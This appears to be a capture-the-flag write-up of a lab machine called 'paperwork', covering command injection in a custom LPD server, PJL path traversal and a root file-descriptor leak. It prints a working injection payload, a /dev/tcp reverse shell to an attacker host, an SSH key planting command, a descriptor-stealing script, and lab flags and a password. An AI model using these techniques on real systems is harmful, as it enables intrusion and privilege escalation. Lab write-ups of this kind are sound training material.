### 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```
nmap -A paperwork.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-25 09:58 +0200
Nmap scan report for paperwork.htb (10.129.109.8)
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain?
80/tcp open  http    nginx 1.28.0 (Ubuntu)
|_http-server-header: nginx/1.28.0 (Ubuntu)
|_http-title: Intranet | Document Archiving Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 2. Enumeration

The Nmap scan revealed SSH (22), a local DNS resolver (53), and HTTP (80). The web page was titled "Intranet | Document Archiving Service".

Browsing `http://paperwork.htb` led to an "Intake Portal" disclosing critical configuration details:

```
Protocol            Compliance Level: RFC 1179
Target Queue        archive_intake
Internal Processor  paperwork-archive-v1.02
```

This confirmed the presence of an LPD (Line Printer Daemon, RFC 1179) service. Port 1515 — a non-standard LPD port — was open. Initial attempts using PJL commands (`@PJL INFO ID`) against this port failed silently: the server would ACK the data and send FIN with no response, because it speaks the LPD wire protocol, not PJL/RAW. Port 9100, discovered later through internal enumeration, turned out to be the actual JetDirect/PJL endpoint.

The same web page also hosted a downloadable copy of the service's source code, revealing a custom Python LPD implementation with a critical code injection path.

### 3. Foothold 

**Vulnerability Analysis**

The custom LPD server (`server.py`) processes incoming print jobs with the following logic:

```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The `job_name` field — extracted directly from the client-supplied LPD control file — is interpolated into a shell command executed via `subprocess.Popen(..., shell=True)` without any sanitization. Breaking out of the surrounding single quotes allows arbitrary command injection.

**Exploitation**

The LPD handshake (reconstructed from `server.py`) requires:

1. `0x02` + queue name + `\n` — the queue name (`archive_intake`) was disclosed on the Intake Portal; an incorrect queue caused the server to respond with `0x01` and close.
2. A sub-command byte + `"<size> <filename>\n"` header describing the control file.
3. The control file content, containing a line starting with `J` (job name) — the injected field.

A Python exploit script was written to replicate this handshake:

```python
payload = f"x'; {command}; echo '"
control_content = f"J{payload}\n".encode()
```

Running it with a reverse shell payload:

```bash
python3 exploit_lpd.py paperwork.htb -q archive_intake \
  -c "bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"
```

caught a shell as the `lp` user, confirming the LPD service runs under this low-privilege system account.

### 4. Lateral Movement 

**Enumeration as `lp`**

Listing active sockets revealed an internal service on port 9100, not externally exposed:

```
tcp  LISTEN  127.0.0.1:9100   users:(("python3",pid=983,fd=4))
```

The running process was:

```
archivist  983  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/
```

A Python-based JetDirect/PJL server, running as `archivist`, serving files from `/home/archivist/printer/` as its virtual root.

Since `nc` was unavailable, all interaction with port 9100 was done via bash's `/dev/tcp` and Python sockets.

**Vulnerability Analysis**

Reading `jetdirect.py` via `@PJL FSUPLOAD NAME="0:\jetdirect.py"` revealed the following path translation function:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

There is no check that the resolved path remains inside `self._root`. Supplying `0:/../.ssh/authorized_keys` resolves to `/home/archivist/.ssh/authorized_keys` after `normpath`, giving both read (`FSUPLOAD`) and write (`FSDOWNLOAD`) access to arbitrary files owned by `archivist`.

**Exploitation**

Listing `0:/../.ssh` confirmed `authorized_keys` existed but was empty (size 0). A key pair was generated locally and the public key was written to `authorized_keys` via `FSDOWNLOAD`:

```bash
PUBKEY=$(cat /tmp/mykey.pub)
SIZE=${#PUBKEY}

exec 3<>/dev/tcp/127.0.0.1/9100
printf "\x1b%%-12345X@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=${SIZE}\r\n${PUBKEY}" >&3
timeout 2 cat <&3
exec 3<&-
```

Then connected as `archivist`:

```bash
ssh -i /tmp/mykey archivist@127.0.0.1
```

**User flag:**

```
c3255353482b83cc963781c4c52b13de
```

### 5. Privilege Escalation

**Enumeration as `archivist`**

Running LinPEAS revealed two key findings:

- A root-owned daemon: `root 1461 /usr/bin/python3 /usr/bin/paperwork-daemon`
- A world-accessible Unix socket: `/run/paperwork/mgmt.sock` (owned by root, group `archivist`)

**Vulnerability Analysis**

Reading `/usr/bin/paperwork-daemon` revealed the following logic:

```python
# At startup, root opens the admin config file and keeps the fd open
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)

def scan_for_malice():
    # Returns True if the JetDirect command log contains PJL commands
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    # Sends BOTH file descriptors to the connecting client via SCM_RIGHTS
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

The daemon opens `/etc/paperwork/admin_pins.conf` at startup as root and holds the file descriptor in memory. When it detects PJL commands in the JetDirect log, it sends that fd — along with the log fd — to whoever connects to the socket via the Unix SCM_RIGHTS ancillary data mechanism. The receiving process can then `pread()` directly from the fd, bypassing all filesystem permissions.

The PJL interaction performed earlier (FSUPLOAD, FSDIRLIST) had already written those command strings into the log at `/home/archivist/printer/logs/commands.log`.

**Exploitation**

First, a fresh PJL command was triggered to ensure the log contained the trigger string (it had been truncated by a prior lockdown cycle):

```bash
exec 3<>/dev/tcp/127.0.0.1/9100
printf '\x1b%%-12345X@PJL FSUPLOAD NAME="0:/jetdirect.py"\r\n\x1b%%-12345X' >&3
timeout 1 cat <&3 > /dev/null
exec 3<&-
```

Then the socket was connected to and the file descriptors were received and read:

```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array('i')
msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(8 * fds.itemsize))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
        for fd in fds:
            print(os.pread(fd, 4096, 0).decode(errors='replace'))
            os.close(fd)
s.close()
```

Output:

```
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
FDs received: [4, 5]
--- FD 4 --- (commands.log)
Command: @PJL FSUPLOAD NAME="0:/jetdirect.py"

--- FD 5 --- (admin_pins.conf)
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

The password was used to switch to root:

```bash
su - root
Password: ApparelMortuaryCedar22
```

**Root flag:**

```
fc75aa38768209b41789ada3b4b52e69
```
